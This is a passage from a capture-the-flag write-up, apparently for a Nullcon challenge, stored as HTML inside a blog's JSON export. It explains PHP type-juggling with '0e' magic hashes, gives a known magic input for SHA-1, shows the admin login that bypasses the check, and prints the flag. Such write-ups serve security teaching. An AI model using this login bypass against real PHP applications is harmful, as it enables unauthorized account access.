id=\"Vulnerability-Identification-1\"><a href=\"#Vulnerability-Identification-1\" class=\"headerlink\" title=\"Vulnerability Identification\"></a>Vulnerability Identification</h2><p>As we observe the hashed passwords, we notice that password of admin starts with ‘0e’. This is a common vulnerability in PHP, where the hashed password is interpreted as 0 instead of the actual hash value ‘0e12345678912345678920202020202020202020’.</p>\n<h2 id=\"Exploiting-the-Vulnerability-1\"><a href=\"#Exploiting-the-Vulnerability-1\" class=\"headerlink\" title=\"Exploiting the Vulnerability\"></a>Exploiting the Vulnerability</h2><p>To exploit this vulnerability, we need to find a value whose SHA-1 hash starts with ‘0e’. One common technique for this is known as Type Juggling. More details about this technique can be found <a href=\"https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md\">here</a>.</p>\n<p>For instance, the SHA-1 hash of ‘10932435112’ starts with ‘0e’, so in PHP, it will be interpreted as 0.</p>\n<h2 id=\"Obtaining-the-Flag-1\"><a href=\"#Obtaining-the-Flag-1\" class=\"headerlink\" title=\"Obtaining the Flag\"></a>Obtaining the Flag</h2><p>To retrieve the flag, we need to log in with the username ‘admin’ and the password ‘10932435112’:</p>\n<p>Username: admin<br>Password: 10932435112</p>\n<p>Flag: <strong>ENO{m4ny_th1ng5_c4n_g0_wr0ng_1f_y0u_d0nt_ch3ck_typ35}</strong></p>\n<p><img src=\"/./images/nullcon/typicalboss/flag.png\" alt=\"Flag\"></p>\n<p>Thank You</p>\n"}],"PostAsset":[],"PostCategory":[],"PostTag":[],"Tag":[]}}